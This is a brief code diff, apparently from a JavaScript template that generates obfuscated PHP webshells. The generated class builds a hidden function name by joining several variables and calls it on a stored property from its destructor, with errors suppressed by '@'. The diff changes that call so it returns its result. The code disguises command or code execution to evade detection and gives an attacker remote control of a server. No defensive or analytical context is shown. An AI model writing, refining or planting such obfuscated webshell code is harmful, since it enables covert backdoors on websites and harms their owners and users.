@@ -122,7 +122,7 @@ class ${name} {
     function __destruct() {
 ${lines}
         $db =${[0,1,2,3,4,5].map((t, i)=>`$_${t}`).join(".")};
-        @$db("$this->c");
+        return @$db($this->c);
     }
 }
 $${name.toLowerCase()} = new ${name}();
